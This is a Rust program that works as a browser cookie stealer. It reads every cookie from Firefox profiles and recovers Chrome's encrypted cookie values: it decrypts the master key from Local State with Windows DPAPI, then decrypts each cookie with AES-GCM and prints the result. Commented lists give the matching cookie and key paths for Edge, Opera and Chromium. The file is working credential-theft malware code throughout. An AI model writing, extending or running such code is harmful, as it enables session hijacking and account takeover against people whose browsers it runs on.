use base64::decode;
use platform_dirs::AppDirs;
use serde_json;
use sqlite::State;
use std::fs::File;
use std::fs::{self};
use std::io::Read;
use std::ptr;
use std::slice::from_raw_parts;
use winapi::um::dpapi::CryptUnprotectData;
use winapi::um::wincrypt::CRYPTOAPI_BLOB;

use aes_gcm::aead::{generic_array::GenericArray, Aead, NewAead};
use aes_gcm::Aes256Gcm;

fn main() {
    let mut total_cookies: Vec<Vec<String>> = Vec::new();
    let mut ff_cookies = firefox_stealer();
    let mut chrome_cookies = chrome_stealer();
    total_cookies.append(&mut ff_cookies);
    total_cookies.append(&mut chrome_cookies);
    println!("{:?}", total_cookies);
}

fn firefox_stealer() -> Vec<Vec<String>> {
    // returns vec with a vec of website,name,value
    // firefox
    // C:\Users\emmet\AppData\Roaming\Mozilla\Firefox\Profiles looking for a cookies.sqlite file
    let mut cookies: Vec<Vec<String>> = Vec::new();
    let app_dirs = AppDirs::new(Some(""), true).unwrap();
    let roaming = app_dirs.config_dir;
    let firefox_profile_path = roaming.join("Mozilla").join("Firefox").join("Profiles");
    if firefox_profile_path.is_dir() {
        for path in fs::read_dir(firefox_profile_path).unwrap() {
            let sqlite_db = path.unwrap().path().join("cookies.sqlite");
            if sqlite_db.exists() {
                let connection = sqlite::open(sqlite_db).unwrap();
                let mut statement = connection
                    .prepare("SELECT host, name, value FROM moz_cookies")
                    .unwrap();
                while let State::Row = statement.next().unwrap() {
                    let mut cookie: Vec<String> = Vec::new();
                    cookie.push(statement.read::<String>(0).unwrap());
                    cookie.push(statement.read::<String>(1).unwrap());
                    cookie.push(statement.read::<String>(2).unwrap());
                    cookies.push(cookie);
                }
            }
        }
    }
    return cookies;
}

fn get_key(enc_key: &serde_json::Value) -> Vec<u8> {
    let mut b_64_decoded =
        decode(enc_key.as_str().unwrap()).expect("failed to decode base64 aes key");
    b_64_decoded.remove(0);
    b_64_decoded.remove(0);
    b_64_decoded.remove(0);
    b_64_decoded.remove(0);
    b_64_decoded.remove(0);
    let mut p_password_in = CRYPTOAPI_BLOB {
        cbData: b_64_decoded.len() as u32,
        pbData: b_64_decoded.as_mut_ptr(),
    };
    let mut p_password_out = CRYPTOAPI_BLOB::default();
    let ppin = &mut p_password_in;
    let pout = &mut p_password_out;
    let mut dec_key: Vec<u8> = Vec::new();
    unsafe {
        let result = CryptUnprotectData(
            ppin,
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            0,
            pout,
        );
        if result == 1 {
            let mut pass_decoded: Vec<u8> =
                from_raw_parts(p_password_out.pbData, p_password_out.cbData as _).to_vec();
            dec_key.append(&mut pass_decoded);
        }
    }
    return dec_key;
}

fn chrome_stealer() -> Vec<Vec<String>> {
    // returns vec with a vec of website,name,value
    let mut cookies: Vec<Vec<String>> = Vec::new();
    let app_dirs = AppDirs::new(Some(""), true).unwrap();
    let local = app_dirs.cache_dir;
    let chrome_user_data_folder = local.join("Google").join("Chrome").join("User Data");
    let chrome_default_state = chrome_user_data_folder.join("Local State");
    let mut chrome_default_state_file =
        File::open(&chrome_default_state).expect("failed to open json key file");
    let mut chrome_default_state_contents = String::new();
    chrome_default_state_file
        .read_to_string(&mut chrome_default_state_contents)
        .expect("failed to write to string");
    let key_file_json: serde_json::Value =
        serde_json::from_str(chrome_default_state_contents.as_str())
            .expect("JSON was not well-formatted");
    let enc_key = &key_file_json["os_crypt"]["encrypted_key"];
    let dec_key = get_key(enc_key);
    let chrome_cookies = local
        .join("Google")
        .join("Chrome")
        .join("User Data")
        .join("Default")
        .join("Cookies");
    if chrome_cookies.is_file() {
        let connection = sqlite::open(chrome_cookies).unwrap();
        let mut statement = connection
            .prepare("SELECT host_key,name,encrypted_value FROM cookies")
            .unwrap();
        let key = GenericArray::from_slice(&dec_key);
        let cipher = Aes256Gcm::new(key);
        while let State::Row = statement.next().unwrap() {
            // println!("website = {}", statement.read::<String>(0).unwrap());
            // println!("name = {}", statement.read::<String>(1).unwrap());
            // println!(
            //     "enc value = {:?}",
            //     String::from_utf8_lossy(&statement.read::<Vec<u8>>(2).unwrap())
            // );
            let mut cookie: Vec<String> = Vec::new();
            cookie.push(statement.read::<String>(0).unwrap()); // website
            cookie.push(statement.read::<String>(1).unwrap()); // name
            let enc_data = statement.read::<Vec<u8>>(2).unwrap();
            let nonce = GenericArray::from_slice(&enc_data[3..15]);
            let data_to_be_decrypted = &enc_data[15..];
            let plaintext = cipher
                .decrypt(nonce, data_to_be_decrypted.as_ref())
                .expect("decryption failure!");
            cookie.push(String::from_utf8_lossy(&plaintext).into_owned()); // value
            cookies.push(cookie);
            // println!("{:?}", String::from_utf8_lossy(&plaintext))
        }
    };
    return cookies;
}

// everything else
//     'windows_cookies':[
//         {'env':'APPDATA', 'path':'..\\Local\\Microsoft\\Edge\\User Data\\Default\\Cookies'},
//         {'env':'LOCALAPPDATA', 'path':'Microsoft\\Edge\\User Data\\Default\\Cookies'},
//         {'env':'APPDATA', 'path':'Microsoft\\Edge\\User Data\\Default\\Cookies'}
// ],
//     'windows_keys': [
//         {'env':'APPDATA', 'path':'..\\Local\\Microsoft\\Edge\\User Data\\Local State'},
//         {'env':'LOCALAPPDATA', 'path':'Microsoft\\Edge\\User Data\\Local State'},
//         {'env':'APPDATA', 'path':'Microsoft\\Edge\\User Data\\Local State'}
// ],

//     'windows_cookies':[
//         {'env':'APPDATA', 'path':'..\\Local\\Opera Software\\Opera Stable\\Cookies'},
//         {'env':'LOCALAPPDATA', 'path':'Opera Software\\Opera Stable\\Cookies'},
//         {'env':'APPDATA', 'path':'Opera Software\\Opera Stable\\Cookies'}
// ],
// 'windows_keys': [
//         {'env':'APPDATA', 'path':'..\\Local\\Opera Software\\Opera Stable\\Local State'},
//         {'env':'LOCALAPPDATA', 'path':'Opera Software\\Opera Stable\\Local State'},
//         {'env':'APPDATA', 'path':'Opera Software\\Opera Stable\\Local State'}
// ],

//     'windows_cookies':[
//         {'env':'APPDATA', 'path':'..\\Local\\Chromium\\User Data\\Default\\Cookies'},
//         {'env':'LOCALAPPDATA', 'path':'Chromium\\User Data\\Default\\Cookies'},
//         {'env':'APPDATA', 'path':'Chromium\\User Data\\Default\\Cookies'}
// ],
// 'windows_keys': [
//         {'env':'APPDATA', 'path':'..\\Local\\Chromium\\User Data\\Local State'},
//         {'env':'LOCALAPPDATA', 'path':'Chromium\\User Data\\Local State'},
//         {'env':'APPDATA', 'path':'Chromium\\User Data\\Local State'}
// ],

//     'windows_cookies':[
//         {'env':'APPDATA', 'path':'..\\Local\\Google\\Chrome\\User Data\\Default\\Cookies'},
//         {'env':'LOCALAPPDATA', 'path':'Google\\Chrome\\User Data\\Default\\Cookies'},
//         {'env':'APPDATA', 'path':'Google\\Chrome\\User Data\\Default\\Cookies'}
//     ],
// 'windows_keys': [
//         {'env':'APPDATA', 'path':'..\\Local\\Google\\Chrome\\User Data\\Local State'},
//         {'env':'LOCALAPPDATA', 'path':'Google\\Chrome\\User Data\\Local State'},
//         {'env':'APPDATA', 'path':'Google\\Chrome\\User Data\\Local State'}
//     ],
